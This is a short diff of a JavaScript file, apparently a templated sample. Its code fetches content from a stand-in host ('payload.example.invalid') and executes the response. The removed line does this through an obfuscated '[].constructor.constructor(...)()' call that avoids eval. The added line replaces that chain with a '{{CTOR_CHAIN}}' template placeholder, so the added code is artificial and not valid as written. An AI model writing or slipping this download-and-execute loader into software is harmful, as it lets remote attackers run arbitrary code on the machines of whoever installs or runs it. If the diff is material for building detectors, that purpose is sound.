@@ -2,5 +2,5 @@
 const axios = require("axios");
 
 axios.get("https://payload.example.invalid/f").then((r) => {
-  [].constructor.constructor(r.data)();
+  [].{{CTOR_CHAIN}}(r.data)();
 });
